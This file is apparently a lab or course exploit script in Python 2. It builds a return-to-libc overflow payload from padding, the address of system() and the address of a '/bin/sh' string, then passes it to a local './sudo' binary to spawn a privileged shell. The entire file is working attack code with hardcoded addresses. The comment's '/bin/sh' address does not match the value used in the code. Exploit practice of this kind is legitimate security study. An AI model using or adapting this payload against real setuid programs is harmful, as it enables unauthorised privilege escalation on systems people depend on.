import os, sys


PATH_TO_SUDO = './sudo'

def get_arg():
    
    #the address of the return address if 0xbfffdfdc
    #the string bin/sh is at 0xb7d7d82c
    #system address is 0xb7c5cda0
    #exit address is 0xb7c509d0
    bigSystem = "b7c5cda0".decode("hex")
    #the system expects binary in little-endian convention, so we need to flip the address
    bigBin = "b7d7d82b".decode("hex")

    littleSystem = bigSystem[::-1]
    littleBin= bigBin[::-1]

    return 'A'*56 +'BBBB'+ 'CC'+'DDDD'+littleSystem+'XXXX'+littleBin



def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());

if __name__ == '__main__':
    main(sys.argv)
